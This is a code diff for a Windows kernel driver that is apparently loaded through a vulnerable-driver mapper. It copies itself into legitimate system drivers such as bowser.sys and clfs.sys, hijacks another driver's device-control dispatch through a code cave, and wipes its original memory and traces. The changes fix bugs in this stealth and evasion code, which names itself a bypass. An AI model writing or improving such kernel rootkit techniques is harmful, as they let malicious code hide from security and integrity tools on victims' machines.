@@ -1061,12 +1061,12 @@ struct STOMP_CANDIDATE {
 };
 
 static const STOMP_CANDIDATE kStompTargets[] = {
-    { L"luafv.sys",    0x20000 },
-    { L"Ndu.sys",      0x18000 },
-    { L"volsnap.sys",  0x30000 },
-    { L"clfs.sys",     0x30000 },
-    { L"cng.sys",      0x40000 },
-    { L"bowser.sys",   0x18000 },
+    { L"bowser.sys",   0x18000 },   // SMB browser - nearly dormant on modern Windows
+    { L"Ndu.sys",      0x18000 },   // Network Data Usage - minimal activity
+    { L"volsnap.sys",  0x30000 },   // Volume Shadow Copy - idle unless backup running
+    { L"clfs.sys",     0x30000 },   // Common Log - low activity
+    { L"cng.sys",      0x40000 },   // Crypto - used but large
+    // NOT luafv.sys - it's a minifilter actively handling all file I/O
 };
 
 static PLDR_DATA_TABLE_ENTRY SelectStompTarget(PVOID ntBase, ULONG requiredSize) {
@@ -1515,6 +1515,10 @@ extern "C" NTSTATUS DriverEntry(_In_ PDRIVER_OBJECT DriverObject,
         }
         g_borrowedDrv = pDevOwner;
 
+        // Set globals BEFORE hooking dispatch — stomped code needs these
+        g_origDevCtrl = pDevOwner->MajorFunction[IRP_MJ_DEVICE_CONTROL];
+        g_pDevice = pDevOwner->DeviceObject;
+
         // Install dispatch hook
         PDRIVER_DISPATCH dispFn = nullptr;
 
@@ -1522,6 +1526,47 @@ extern "C" NTSTATUS DriverEntry(_In_ PDRIVER_OBJECT DriverObject,
             // After stomp: point dispatch into stomped image directly
             LONGLONG delta = (LONGLONG)((ULONG_PTR)newBase - (ULONG_PTR)selfBase);
             PDRIVER_DISPATCH stompedDispatch = (PDRIVER_DISPATCH)((PUCHAR)DispatchIoctl + delta);
+
+            // Sync ALL globals to the stomped image BEFORE anything uses them
+            // The stomped copy has stale globals from the time of StompIntoTarget()
+            // We need to patch: g_origDevCtrl, g_pDevice, g_borrowedDrv, g_ntBase, etc.
+            {
+                ULONG_PTR off_origDevCtrl = (ULONG_PTR)&g_origDevCtrl - (ULONG_PTR)selfBase;
+                ULONG_PTR off_pDevice     = (ULONG_PTR)&g_pDevice - (ULONG_PTR)selfBase;
+                ULONG_PTR off_borrowedDrv = (ULONG_PTR)&g_borrowedDrv - (ULONG_PTR)selfBase;
+                ULONG_PTR off_ntBase      = (ULONG_PTR)&g_ntBase - (ULONG_PTR)selfBase;
+                ULONG_PTR off_drvStatus   = (ULONG_PTR)&g_drvStatus - (ULONG_PTR)selfBase;
+                ULONG_PTR off_mmUnloaded  = (ULONG_PTR)&g_mmUnloadedArr - (ULONG_PTR)selfBase;
+                ULONG_PTR off_cachedProc  = (ULONG_PTR)&g_cachedProcess - (ULONG_PTR)selfBase;
+                ULONG_PTR off_cachedDir   = (ULONG_PTR)&g_cachedDirBase - (ULONG_PTR)selfBase;
+                ULONG_PTR off_walkPtr     = (ULONG_PTR)&g_pWalkChainPtr - (ULONG_PTR)selfBase;
+                ULONG_PTR off_walkOrig    = (ULONG_PTR)&g_origWalkChain - (ULONG_PTR)selfBase;
+                ULONG_PTR off_cavePtr     = (ULONG_PTR)&g_cavePtr - (ULONG_PTR)selfBase;
+                ULONG_PTR off_poisonLdr   = (ULONG_PTR)&g_poisonedLdr - (ULONG_PTR)selfBase;
+
+                PIMAGE_NT_HEADERS selfNt2 = RtlImageNtHeader(selfBase);
+                ULONG imgSize = selfNt2 ? selfNt2->OptionalHeader.SizeOfImage : 0;
+
+                #define SYNC_GLOBAL(off, var) do { \
+                    if ((off) + sizeof(var) <= imgSize) \
+                        WritePhysPage((PUCHAR)newBase + (off), &(var), sizeof(var)); \
+                } while(0)
+
+                SYNC_GLOBAL(off_origDevCtrl, g_origDevCtrl);
+                SYNC_GLOBAL(off_pDevice, g_pDevice);
+                SYNC_GLOBAL(off_borrowedDrv, g_borrowedDrv);
+                SYNC_GLOBAL(off_ntBase, g_ntBase);
+                SYNC_GLOBAL(off_mmUnloaded, g_mmUnloadedArr);
+                SYNC_GLOBAL(off_cachedProc, g_cachedProcess);
+                SYNC_GLOBAL(off_cachedDir, g_cachedDirBase);
+                SYNC_GLOBAL(off_walkPtr, g_pWalkChainPtr);
+                SYNC_GLOBAL(off_walkOrig, g_origWalkChain);
+                SYNC_GLOBAL(off_cavePtr, g_cavePtr);
+                SYNC_GLOBAL(off_poisonLdr, g_poisonedLdr);
+                SYNC_GLOBAL(off_drvStatus, g_drvStatus);
+
+                #undef SYNC_GLOBAL
+            }
 
             // Install cave in host driver pointing to stomped dispatch
             PLDR_DATA_TABLE_ENTRY hostLdr = (PLDR_DATA_TABLE_ENTRY)pDevOwner->DriverSection;
@@ -1534,6 +1579,13 @@ extern "C" NTSTATUS DriverEntry(_In_ PDRIVER_OBJECT DriverObject,
                         g_drvStatus.CaveInstalled = 1;
                         g_drvStatus.CaveVA = (ULONGLONG)result;
                         dispFn = (PDRIVER_DISPATCH)result;
+
+                        // Sync cave pointer to stomped image too
+                        ULONG_PTR off_cavePtr = (ULONG_PTR)&g_cavePtr - (ULONG_PTR)selfBase;
+                        PIMAGE_NT_HEADERS selfNt2 = RtlImageNtHeader(selfBase);
+                        ULONG imgSize = selfNt2 ? selfNt2->OptionalHeader.SizeOfImage : 0;
+                        if (off_cavePtr + sizeof(g_cavePtr) <= imgSize)
+                            WritePhysPage((PUCHAR)newBase + off_cavePtr, &g_cavePtr, sizeof(g_cavePtr));
                     }
                 }
             }
@@ -1544,9 +1596,8 @@ extern "C" NTSTATUS DriverEntry(_In_ PDRIVER_OBJECT DriverObject,
             if (!dispFn) dispFn = DispatchIoctl;
         }
 
-        g_origDevCtrl = pDevOwner->MajorFunction[IRP_MJ_DEVICE_CONTROL];
+        // NOW hook the dispatch — stomped globals are ready
         pDevOwner->MajorFunction[IRP_MJ_DEVICE_CONTROL] = dispFn;
-        g_pDevice = pDevOwner->DeviceObject;
 
         // ---- Phase 4: Scrub original pool allocation ----
         if (newBase && selfBase) {
@@ -1554,22 +1605,35 @@ extern "C" NTSTATUS DriverEntry(_In_ PDRIVER_OBJECT DriverObject,
             if (selfNt) {
                 g_drvStatus.PoolScrubbed = 1;
 
-                // Sync final status to stomped image
-                LONGLONG delta = (LONGLONG)((ULONG_PTR)newBase - (ULONG_PTR)selfBase);
+                // Final status sync
                 ULONG_PTR statusOff = (ULONG_PTR)&g_drvStatus - (ULONG_PTR)selfBase;
                 WritePhysPage((PUCHAR)newBase + statusOff, &g_drvStatus, sizeof(BYPASS_STATUS));
 
-                // Zero the pool — headers first, then all pages
+                // Zero the pool — after this point, only stomped code is live
                 ULONG imageSize = selfNt->OptionalHeader.SizeOfImage;
                 RtlZeroMemory(selfBase, min(imageSize, (ULONG)PAGE_SIZE));
             }
         }
 
         // ---- Phase 5: Deferred trace cleanup (runs after we're settled) ----
+        // If stomped, the work item + callback must use stomped addresses
         if (ntBase) {
-            g_cleanupWork.NtBase = ntBase;
-            ExInitializeWorkItem(&g_cleanupWork.Item, DeferredCleanupCallback, &g_cleanupWork);
-            ExQueueWorkItem(&g_cleanupWork.Item, DelayedWorkQueue);
+            if (newBase && selfBase) {
+                // Calculate stomped addresses for the work item
+                LONGLONG delta = (LONGLONG)((ULONG_PTR)newBase - (ULONG_PTR)selfBase);
+                CLEANUP_WORK* stompedWork = (CLEANUP_WORK*)((PUCHAR)&g_cleanupWork + delta);
+                PWORKER_THREAD_ROUTINE stompedCallback =
+                    (PWORKER_THREAD_ROUTINE)((PUCHAR)DeferredCleanupCallback + delta);
+
+                stompedWork->NtBase = ntBase;
+                ExInitializeWorkItem(&stompedWork->Item, stompedCallback, stompedWork);
+                ExQueueWorkItem(&stompedWork->Item, DelayedWorkQueue);
+            } else {
+                // Not stomped — use pool addresses directly
+                g_cleanupWork.NtBase = ntBase;
+                ExInitializeWorkItem(&g_cleanupWork.Item, DeferredCleanupCallback, &g_cleanupWork);
+                ExQueueWorkItem(&g_cleanupWork.Item, DelayedWorkQueue);
+            }
         }
 
         LOG("[+] DriverEntry: KDU path complete — comm via host driver\n");
